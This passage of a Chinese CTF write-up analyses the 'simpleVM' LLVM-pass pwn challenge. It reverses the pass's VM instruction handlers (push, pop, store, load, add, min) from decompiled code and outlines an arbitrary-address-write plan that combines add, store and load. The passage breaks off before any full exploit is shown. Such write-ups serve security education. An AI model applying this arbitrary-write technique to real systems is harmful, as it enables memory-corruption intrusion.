class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_6510</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>PASS</code>注册名称为<code>VMPass</code>。我们尝试在<code>ida</code>中查找<code>runOnFunction</code>函数，结果发现这个函数的符号表给删了？图片中的<code>sub_6830</code>函数即为我们要找的<code>runOnFunction</code>函数函数  </p><img src="/2024/03/15/llvm/3.png" class="" title="我的图图呢">  <p>接下来分析一下<code>runOnFunction</code>函数  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改函数先通过<code>getName(a2)</code>来获取<code>.ll</code>文件中定义的函数名字，如果该函数的名字为<code>o0o0o0o0</code>，则会进入<code>sub_6AC0</code>这个函数进行进一步的处理<br>定位到关键函数<code>sub_6B80</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOperand = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              ZExtValue = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="type">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="type">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里我们终于可以知道为什么题目的名字叫<code>simpleVM</code>了，这就是很经典的<code>VMpwn</code>，只不过和<code>llvm pass</code>相结合而已。这个函数实现了<code>push</code>、<code>pop</code>、<code>store</code>、<code>load</code>、<code>add</code>指令功能。为了方便看懂代码，这里先简单分析几个<code>llvm pass</code>中的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br></pre></td></tr></table></figure><p>获取函数的名字并赋值给<code>Name</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br></pre></td></tr></table></figure><p>获取函数的一个参数并将其赋值给<code>v8</code><br>这里我选择使用<code>add</code>、<code>store</code>、<code>load</code>相互配合来实现任意地址写，下面给出关键代码片段  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">if</span> ( v23 )&#123;</span><br><span class="line">    v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">    v24 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">    v24 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v24 == off_20DFD0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load</span></span><br><span class="line"><span class="keyword">if</span> ( v19 )&#123;</span><br><span class="line">    v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">    v20 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">    v20 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">    *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">    *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          </span><br><span class="line"><span class="comment">// add</span></span><br><span class="line"><span class="keyword">if</span> ( v15 )&#123;</span><br><span class="line">    v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">    v16 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">    v16 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 )&#123;</span><br><span class="line">    v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">    v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span 